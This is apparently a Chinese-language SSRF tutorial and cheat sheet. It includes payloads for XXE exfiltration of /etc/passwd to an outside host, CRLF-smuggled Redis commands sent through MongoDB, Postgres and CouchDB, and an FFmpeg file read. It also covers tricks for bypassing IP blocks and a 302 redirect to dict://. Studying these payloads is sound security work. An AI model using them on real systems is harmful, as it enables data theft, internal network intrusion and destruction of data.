# SSRF

## 介绍

### 什么是SSRF

`SSRF`(Server-Side Request Forgery:服务器端请求伪造),由攻击者构造的攻击链接传给服务端执行造成的漏洞.
`SSRF`通过利用一个**可以发送网络请求的服务**，**以它为跳板对其他资源进行访问或者说攻击**。

通俗点讲，`SSRF`的攻击方式其实就类似于抓了一个肉鸡，然后有这个肉鸡去执行攻击者后续想要执行的操作。这样一来，在受到攻击或者说接收到网络请求的服务器的视角看，对它进行攻击的是这台肉鸡服务器而非攻击者。
（即：身份伪造）
这个时候如果这台所谓的 "肉鸡" 服务器对于攻击者所攻击的目标又拥有特殊身份权限的话，便是所谓的`SSRF`攻击了。

![20210918151006](https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20210918151006.png)

常见的`SSRF`攻击多为通过跳板机访问目标资源。形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。

### SSRF可以做什么

+ 扫描内部网络的 服务 or 资源
+ 利用file协议读取本地文件等
+ 暴力穷举（如：users|dirs|files）
+ DOS攻击（请求大文件，始终保持连接Keep-Alive Always）
+ 向内部**任意主机**的**任意端口**发送攻击者精心构造的数据包。

常用协议：

| 协议名称 |         简介         |
|---------|----------------------|
|  Gopher | 攻击内部应用的主力军   |
|   Dict  | 端口探测，版本信息收集 |
|   ftp   | 探测是否存在ftp       |
|   http  | 探测是否存在ssrf      |
|   file  | 读取本地文件          |

注意：jdk1.7后java不再支持gopher

![2059787-20201019111517054-1252234555](https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages2059787-20201019111517054-1252234555.png)

### 怎么找SSRF

+ 能够对外发起网络请求的地方
+ 从远程服务器请求资源（Upload from URL 、Import & Export RSS feed）
+ 数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）
+ Webmail 收取其他邮箱邮件（POP3 | IMAP | SMTP）
+ 文件处理、编码处理、属性信息处理（ffpmg、ImageMaic、DOCX、PDF、XML处理器）

#### 注意

有两种情况会阻碍`SSRF`的利用：

+ 服务端开启OpenSSL无法进行交互利用
+ 服务端需要鉴权信息（Cookies & Username：Password）

#### 从远程服务器请求资源

+ Upload from URL
  + Discuz!
+ Import & Export RSS feed
  + Web Blog
+ 使用XML引擎对象的地方
  + Wordpress xmlrpc.php
  + XXE实体引用
  + DTD文档类型定义
  + XLST -- XML文档转换为其他格式

##### XML Fuzz Cheatsheet（模糊测试表）

+ DTD Remote Access —— 文档结构标准
＜!ENTITY % d SYSTEM "http://wuyun.org/evil.dtd"＞
+ XML External Entity —— 外部实体引用
＜!ENTITY % file system "file:///etc/passwd"＞
＜!ENTITY % d SYSTEM "http://wuyun.org/file?data=%file"＞
+ URL Invocation —— URL调用
＜!DOCTYPE roottag PUBLIC "-//VSR//PENTEST//EN" "http://wuyun.org/urlin"＞
＜roottag＞test＜/roottag＞
+ XML Encryption —— XML 加密
＜xenc:AgreementMethod Algorithm= "http://wuyun.org/1"＞
＜xenc:EncryptionProperty Target= "http://wuyun.org/2"＞
＜xenc:CipherReference URI= "http://wuyun.org/3"＞
＜xenc:DataReference URI= "http://wuyun.org/4"＞

##### XML Fuzz Cheatsheet —— Web Services 标准项

+ XML Signature — XMLqianming
＜Reference URI="http://wuyun.org/5"＞
+ WS Policy — SOA WS策略项
＜To xmlns="http://www.w3.org/2005/08/addressing"＞http://wuyun.org/to＜/To＞
＜ReplyTo xmlns="http://www.w3.org/2005/08/addressing"＞
＜Address＞http://wuyun.org/rto＜/Address＞
＜/ReplyTo＞
+ From WS Security — JAVA WEB安全策略
＜wsp:PolicyReference URI="http://wuyun.org/pr"＞
+ WS Addressing — Web Services消息寻址
＜input message="wooyun" wsa:Action="http://wuyun.org/ip" /＞
＜output message="wooyun" wsa:Action="http://wuyun.org/op" /＞

##### XML Fuzz Cheatsheet —— 第三方应用与新协议

+ WS Federation —— Web Services通用标准
＜fed:Federation FederationID="http://wuyun.org/fid"＞
＜fed:FederationInclude＞http://wuyun.org/inc＜/fed:FederationInclude＞
＜fed:TokenIssuerName＞http://wuyun.org/iss＜/fed:TokenIssuerName＞
＜mex:MetadataReference＞
    ＜wsa:Address＞http://wuyun.org/mex＜/wsa:Address＞
＜/mex:MetadataReference＞
+ ODATA (edmx)新协议
＜edmx:Reference URI="http://wuyun.org/edmxr"＞
＜edmx:AnnotationsReference URI="http://wuyun.org/edmxa"＞
+ XBRL —— 财务报告标准
＜xbrli:identifier scheme="http://wuyun.org/xbr"＞
＜link:roleType roleURI="http://wuyun.org/role"＞
+ STRATML —— 策略标记语言
＜stratml:Source＞http://wuyun.org/stml＜/stratml:Source＞

##### 数据库内置功能

+ MongoDB
    变废为宝的未授权访问
    >db.copyDatabase('\r\nconfig set dbfilename wyssrf\r\nquit\r\n’,'test','10.6.4.166:6379')

    ```bash
    [root@10-6-4-166 ~]# nc -l -vv 6379
    Connection from 10.6.19.144 port 6379 [tcp/*]
    config set dbfilename wyssrf
    quit
    .system.namespaces
    ```

    > db.copyDatabase(‘helo','test','10.6.4.166:22');
    {"errmsg" : "……helo.systemnamespaces failed: " }
    > db.copyDatabase(‘helo','test','10.6.4.166:9999');
    {"errormsg" : "couldn't connect to server 10.6.4.166:9999"}
    互联网开放了50000+不需要授权访问的 MongoDB Server
+ Oracle
    UTL_HTTP
    UTL_TCP
    UTL_SMTP
    [https://docs.oracle.com/cd/E11882_01/appdev.112/e40758/u_http.htm#ARPLS070](https://docs.oracle.com/cd/E11882_01/appdev.112/e40758/u_http.htm#ARPLS070)
+ PostgresSQL
    dblink_send_query()发起远程查询

    ```sql
    SELECT dblink_send_query(
        'host=127.0.0.1 dbname=quit user=\'\r\nconfig set dbfilename wyssrf\r\nquit\r\n\' password=1 port=6379 sslmode=disable',
        'select version();'
    )
    ```

    回显：
    >[root@localhost ~]# nc -l -vv 6379
    Connection from 127.0.0.1 port 6379 [tcp/*]
    config set dbfilename wyssrf
    quit

    [https://www.postgresql.org/docs/8.4/static/dblink.html](https://www.postgresql.org/docs/8.4/static/dblink.html)
+ MSSQL
    OpenRowset()

    ```sql
    SELECT openrowset('SQLOLEDB',
    'server=192.168.1.5;uid=sa;pwd=sa;database=master')
    ```

    OpenDatasource()

    ```sql
    SELECT * FROM OpenDatasource('SQLOLEDB', 
    'Data Source=ServerName;User ID=sa;Password=sa' ) .Northwind.dbo.Categories
    ```

    [https://msdn.microsoft.com/zh-cn/library/ms190312.aspx](https://msdn.microsoft.com/zh-cn/library/ms190312.aspx)
    协议限制： 穷举用户口令 XP_CMDSHELL
+ CouchDB
    HTTP API /_replicate

    ```sql
    POST http://couchdb-server:5984/_replicate 
    Content-Type: application/json 
    Accept: application/json 
    { 
        "source" : "recipes", 
        "target" : "dict://redis.wuyun.org:6379/flushall”, 
    }
    ```

    [https://docs.couchdb.org/en/stable/api/server/common.html](https://docs.couchdb.org/en/stable/api/server/common.html)

##### Web mail 收取其他邮箱邮件

+ QQ邮箱
+ 163/126邮箱
+ 新浪邮箱

##### 文件处理、编码处理、属性信息处理

网盘 & 邮箱系统
PDF、DOCX 在线编辑
文件自动预览

+ FFmpeg
    concat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd
+ ImageMagick (mvg语法 URL函数向服务器发起HTTP请求)
    fill 'url(http://wyssrf.wuyun.org)'
+ XML parsers ( XSLT ) XSLT包含了超过100个内置函数
    document(): 用来访问另一个xml文档内的信息
    include(): 用来将两个样式表合并
    import(): 用来将一个样式表覆盖另一个

## 利用

### 利用条件

+ 需成功发送针对目标服务漏洞的`payload`

### 遇到限制的绕过方式

#### IP限制绕过（xip.io、十进制IP、八进制IP）

+ 要求对象必须包含域名Domain，且符合`.tld`标准
    url=http://www.10.10.10.10.xip.io
+ 将10、127、172、192开头的私有IP列入黑名单
    十进制IP： \*256\*\*3 + \*256\*\*2 + \*256
    八进制IP：012.10.10.10 = 10.10.10.10

#### 协议限制绕过（Redirect̵CRLF header injection）

+ 只允许`startswith('http')`传入
  + 302 Redirect 跳转 (HTTP Scheme ——> DICT Scheme)
    Discuz! SSRF

    ```url
    /forum.php?mod=ajax&action=downremoteimg&message=[img]http://wuyun.org/302.php?helo.jpg[/img]
    ```

    302.php

    ```php
    <?php
    header("Location: dict://wuyun.org:6379/set:1:helo”); # set 1 helo \n
    ```

  + CRLF ( Ascii Code ) — header injection
    + WebLogic uddiexplorer SSRF

        ```url
        http://localhost:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://wuyun.org/helo&rdoSearch=name&btnSubmit=Search
        ```

    + CRLF ->ASCII Code
        %0d -> 0x0d -> \r
        %0a -> 0x0a -> \n

#### 调用系统支持的协议和方法（Protocols & Wrappers）

![20210918175504](https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20210918175504.png)
